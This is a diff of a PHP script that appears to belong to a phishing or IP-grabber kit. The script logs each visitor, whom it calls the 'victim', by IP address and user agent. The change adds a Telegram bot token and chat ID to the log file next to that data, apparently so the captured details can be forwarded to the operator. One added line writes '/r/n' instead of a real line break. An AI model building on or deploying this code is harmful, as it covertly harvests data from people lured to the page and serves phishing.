@@ -35,21 +35,19 @@ else
       $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
     }
 $useragent = " User-Agent: ";
-$browser = $_SERVER['HTTP_USER_AGENT'];
+$browser = $_SERVER['HTTP_USER_AGENT']."\r\n";
 $victim = "IP: ";
 
-//$tgbot = getenv('TGBOT');
-//$tgchat = getenv('TGCHAT');
-
 $tgbot = getenv('TGBOT', true) ?: getenv('TGBOT');
-
+$tgchat = getenv('TGCHAT', true) ?: getenv('TGCHAT');
 
 fwrite($raw, $victim);
 fwrite($raw, $ipaddress);
 fwrite($raw, $useragent);
 fwrite($raw, $browser);
 fwrite($raw, $tgbot);
-//fwrite($raw, $tgchat);
+fwrite($raw, "/r/n");
+fwrite($raw, $tgchat);
 
 
 
